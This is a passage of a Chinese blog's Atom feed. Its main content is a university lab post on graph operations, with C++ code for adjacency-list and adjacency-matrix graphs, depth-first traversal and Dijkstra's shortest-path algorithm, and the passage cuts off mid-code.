data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwMzkwODc0Ni5wbmc?x-oss-process=image/format,png"  alt="image-20200517203908746"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwNTkxMjU1Ni5wbmc?x-oss-process=image/format,png"  alt="image-20200517205912556"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwNTUzOTIzNi5wbmc?x-oss-process=image/format,png"  alt="image-20200517205539236"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIxMDg1NTk1NC5wbmc?x-oss-process=image/format,png"  alt="image-20200517210855954"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxODE5MzU1MjgwNy5wbmc?x-oss-process=image/format,png"  alt="image-20200518193552807"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxODIxMjYyMzAzMy5wbmc?x-oss-process=image/format,png"  alt="image-20200518212623033"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyMDE2MDYzMzg0MS5wbmc?x-oss-process=image/format,png"  alt="image-20200520160633841"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyNDE3MjgyMzUyNi5wbmc?x-oss-process=image/format,png"  alt="image-20200524172823526"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyNDE3MzQ0NTE5OS5wbmc?x-oss-process=image/format,png"  alt="image-20200524173445199"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;科目一今天满分飘过，特此分享下自己打的笔记。&lt;br&gt;如果你想问我只是科目一而已用的着那么认真吗，别问，问就是因为没复习挂过一
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>实验五 图的操作</title>
    <link href="http://zssblog.top/2020/05/31/%E5%AE%9E%E9%AA%8C%E4%BA%94-%E5%9B%BE%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://zssblog.top/2020/05/31/%E5%AE%9E%E9%AA%8C%E4%BA%94-%E5%9B%BE%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-31T10:00:00.000Z</published>
    <updated>2020-05-31T10:06:08.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验性质：综合性实验"><a href="#实验性质：综合性实验" class="headerlink" title="实验性质：综合性实验"></a>实验性质：综合性实验</h1><h1 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h1><p>（1）采用邻接矩阵/邻接表建立图；<br>（2）采用深度优先/广度优先搜索方式遍历图；<br>（3）编程实现Dijkstra最短路径算法。</p><h1 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h1><p>（1）掌握图的邻接矩阵和邻接表存储方式；<br>（2）掌握图的遍历算法；<br>（3）掌握图的实际应用——最短路径算法。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//***邻接矩阵***//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxInt 32767                 <span class="comment">//表示极大值，即∞</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MVNum 100                   <span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">bool</span> visited[MVNum],visited2[MVNum];    <span class="comment">//初始化标志数组，值为false</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VertexType;         <span class="comment">//假设顶点的数据类型为字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ArcType;                  <span class="comment">//假设边的权值类型为整型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  VertexType vexs[MVNum];               <span class="comment">//顶点表</span></span><br><span class="line">  ArcType arcs[MVNum][MVNum];       <span class="comment">//邻接矩阵</span></span><br><span class="line">  <span class="keyword">int</span> vexnum,arcnum; <span class="comment">//图的顶点数和边数</span></span><br><span class="line">&#125;AMGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//***邻接表***//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>  //边结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> adjvex; <span class="comment">//该边所指向的顶点的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> * <span class="title">nextarc</span>;</span>   <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="keyword">int</span> info; <span class="comment">//和边相关的信息</span></span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>    //顶点信息</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    ArcNode * firstarc; <span class="comment">//指向第一条依附该顶点的边的指针</span></span><br><span class="line">&#125;VNode,AdjList [MVNum]; <span class="comment">//AdjList表示邻接表类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="keyword">int</span> vexnum,arcnum; <span class="comment">//图的当前顶点数和边数</span></span><br><span class="line"></span><br><span class="line">&#125;ALGraph;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(ALGraph G,<span class="keyword">int</span> u)</span></span>; <span class="comment">//返回顶点u在图G中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span></span>;<span class="comment">//邻接表建立无向图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AL</span><span class="params">(ALGraph &amp;G,<span class="keyword">int</span> v)</span></span>;<span class="comment">//邻接表表示图的深度优先搜索遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G2)</span></span>;  <span class="comment">//邻接矩阵法建立有向图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AM</span><span class="params">(AMGraph &amp;G2,<span class="keyword">int</span> v)</span></span>; <span class="comment">//邻接矩阵深度优先搜索遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(AMGraph G, <span class="keyword">int</span> v0)</span></span>;   <span class="comment">//Dijkstra算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ALGraph G;</span><br><span class="line">    AMGraph G2;</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">int</span> v=<span class="number">0</span>,v0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                CreateUDG(G);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                DFS_AL(G,v);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                CreateUDN(G2);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                DFS_AM(G2,v);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                ShortestPath_DIJ(G2,v0);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(ALGraph G,<span class="keyword">int</span> u)</span> <span class="comment">//返回顶点u在图G中的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.vexnum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (u == G.vertices[i].data)</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(AMGraph G2,<span class="keyword">int</span> u)</span> <span class="comment">//返回顶点u在图G中的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G2.vexnum; i++)</span><br><span class="line">        <span class="keyword">if</span>(u==G2.vexs[i])</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span>  <span class="comment">//邻接表法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入总顶点数，总边数:"</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;G.vexnum&gt;&gt;G.arcnum;    <span class="comment">//总顶点数，总边数</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入顶点值:"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++) <span class="comment">//输入各点，构造表头结点表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;G.vertices[i].data;    <span class="comment">//输入顶点值</span></span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;    <span class="comment">//初始化表头结点的指针域为NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入每条边依附的两个顶点:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;G.arcnum;++k) <span class="comment">//输入各边，构造邻接表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> v1,v2;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;v1&gt;&gt;v2;    <span class="comment">//输入一条边依附的两个顶点</span></span><br><span class="line">        <span class="keyword">int</span> i=LocateVex(G,v1); <span class="keyword">int</span> j=LocateVex(G,v2);</span><br><span class="line">        <span class="comment">//确定v1和v2在G中位置，即顶点在G.vertices中的序号</span></span><br><span class="line">        ArcNode *p1=<span class="keyword">new</span> ArcNode; <span class="comment">//生成一个新的边结点</span></span><br><span class="line">        p1-&gt;adjvex=j;   <span class="comment">//邻接点序号为j</span></span><br><span class="line">        p1-&gt;nextarc=G.vertices[i].firstarc; G.vertices[i].firstarc=p1;</span><br><span class="line">        <span class="comment">//将新节点*p1插入v1的边表头部</span></span><br><span class="line">        ArcNode *p2=<span class="keyword">new</span> ArcNode; <span class="comment">//生成另一个对称的新节点*p2</span></span><br><span class="line">        p2-&gt;adjvex=i;   <span class="comment">//邻接点序号为i</span></span><br><span class="line">        p2-&gt;nextarc=G.vertices[j].firstarc; G.vertices[j].firstarc=p2;</span><br><span class="line">        <span class="comment">//将新节点p2插入顶点v1的边表头部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AL</span><span class="params">(ALGraph &amp;G,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//图G为邻接表类型，从第v个顶点出发深度优先搜索遍历图G</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;v;visited[v]=<span class="literal">true</span>; <span class="comment">//访问第v个顶点，并置访问标志数组相应分量值为true</span></span><br><span class="line">    ArcNode *p=G.vertices[v].firstarc;   <span class="comment">//p指向v的第一个边结点</span></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)  <span class="comment">//边结点非空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> w=p-&gt;adjvex;    <span class="comment">//表示w是v的邻接点</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[w])</span><br><span class="line">            DFS_AL(G,w); <span class="comment">//如果w未访问，则递归调用DFS_AL</span></span><br><span class="line">        p=p-&gt;nextarc;   <span class="comment">//p指向下一个边结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G2)</span>  <span class="comment">//邻接矩阵法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//采用邻接矩阵表示法，创建无向网G</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入总顶点数，总边数:"</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;G2.vexnum&gt;&gt;G2.arcnum;  <span class="comment">//输入总顶点数，总边数</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入顶点值:"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;G2.vexnum; ++i)</span><br><span class="line">       <span class="built_in">cin</span>&gt;&gt;G2.vexs[i];                         <span class="comment">//依次输入顶点的信息</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;G2.vexnum;++i) <span class="comment">//初始化邻接矩阵，边的权值均为极大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt;G2.vexnum;++j)</span><br><span class="line">            G2.arcs[i][j] = MaxInt;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入每条边依附的顶点及权值:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k&lt;G2.arcnum;++k)</span><br><span class="line">    &#123; <span class="comment">//构造邻接矩阵</span></span><br><span class="line">      <span class="keyword">int</span> v1,v2,w;</span><br><span class="line">      <span class="built_in">cin</span>&gt;&gt;v1&gt;&gt;v2&gt;&gt;w; <span class="comment">//输入一条边依附的顶点及权值</span></span><br><span class="line">      <span class="keyword">int</span> i = LocateVex(G2, v1);</span><br><span class="line">      <span class="keyword">int</span> j = LocateVex(G2, v2);  <span class="comment">//确定v1和v2在G中的位置</span></span><br><span class="line">      G2.arcs[i][j] = w;  <span class="comment">//边&lt;v1, v2&gt;的权值置为w2</span></span><br><span class="line">      <span class="comment">//取消下面注释即建立无向图</span></span><br><span class="line">      <span class="comment">//G2.arcs[j][i] = G2.arcs[i][j]; //置&lt;v1, v2&gt;的对称边&lt;v2, v1&gt;的权值为w</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AM</span><span class="params">(AMGraph &amp;G2, <span class="keyword">int</span> v)</span></span>&#123;  <span class="comment">//图G2为邻接矩阵类型</span></span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;v;</span><br><span class="line">  visited2[v] = <span class="literal">true</span>;   <span class="comment">//访问第v个顶点</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> w = <span class="number">0</span>; w&lt; G2.vexnum; w++) <span class="comment">//依次检查邻接矩阵v所在的行</span></span><br><span class="line">        <span class="keyword">if</span>((G2.arcs[v][w]!=MaxInt) &amp;&amp; (!visited2[w]))</span><br><span class="line">            DFS_AM(G2, w);</span><br><span class="line">      <span class="comment">//w是v的邻接点，如果w未访问，则递归调用DFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(AMGraph G, <span class="keyword">int</span> v0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> S[MVNum];<span class="keyword">int</span> D[MVNum],Path[MVNum];</span><br><span class="line">    <span class="comment">//用Dijkstra算法求有向网G的v0顶点到其余顶点的最短路径</span></span><br><span class="line">    <span class="keyword">int</span> n=G.vexnum;                         <span class="comment">//n为G中顶点的个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v&lt;n; ++v)</span><br><span class="line">    &#123;               <span class="comment">//n个顶点依次初始化</span></span><br><span class="line">       S[v] = <span class="literal">false</span>;                    <span class="comment">//S初始为空集</span></span><br><span class="line">       D[v] = G.arcs[v0][v];            <span class="comment">//将v0到各个终点的最短路径长度初始化</span></span><br><span class="line">       <span class="keyword">if</span>(D[v]&lt; MaxInt)  Path [v]=v0; <span class="comment">//v0和v之间有弧，将v的前驱置为v0</span></span><br><span class="line">       <span class="keyword">else</span> Path [v]=<span class="number">-1</span>;                <span class="comment">//如果v0和v之间无弧，则将v的前驱置为-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    S[v0]=<span class="literal">true</span>;                     <span class="comment">//将v0加入S</span></span><br><span class="line">    D[v0]=<span class="number">0</span>;                        <span class="comment">//源点到源点的距离为0</span></span><br><span class="line">    <span class="comment">/*―开始主循环，每次求得v0到某个顶点v的最短路径，将v加到S集―*/</span></span><br><span class="line">    <span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n; ++i)</span><br><span class="line">    &#123;<span class="comment">//对其余n?1个顶点，依次进行计算</span></span><br><span class="line">        <span class="keyword">int</span> min= MaxInt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;n; ++w)</span><br><span class="line">          <span class="keyword">if</span>(!S[w]&amp;&amp;D[w]&lt;min)</span><br><span class="line">              &#123;v=w; min=D[w];&#125; <span class="comment">//选择一条当前的最短路径，终点为v</span></span><br><span class="line">        S[v]=<span class="literal">true</span>; <span class="comment">//将v加入S</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;n; ++w)</span><br><span class="line">           <span class="comment">//更新从v0出发到集合V?S上所有顶点的最短路径长度</span></span><br><span class="line">            <span class="keyword">if</span>(!S[w]&amp;&amp;(D[v]+G.arcs[v][w]&lt;D[w]))</span><br><span class="line">            &#123;</span><br><span class="line">                D[w]=D[v]+G.arcs[v][w];     <span class="comment">//更新D[w]</span></span><br><span class="line">                Path [w]=v;                     <span class="comment">//更改w的前驱为v</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"以v0为起点的图的最短路径为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"v0-&gt;v"</span>&lt;&lt;i&lt;&lt;<span class="string">":"</span>;</span><br><span class="line">        <span class="keyword">if</span>(D[i]!=MaxInt) <span class="comment">//可以到达</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;D[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"不可达，无最短路径"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"****by 夏日****"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span 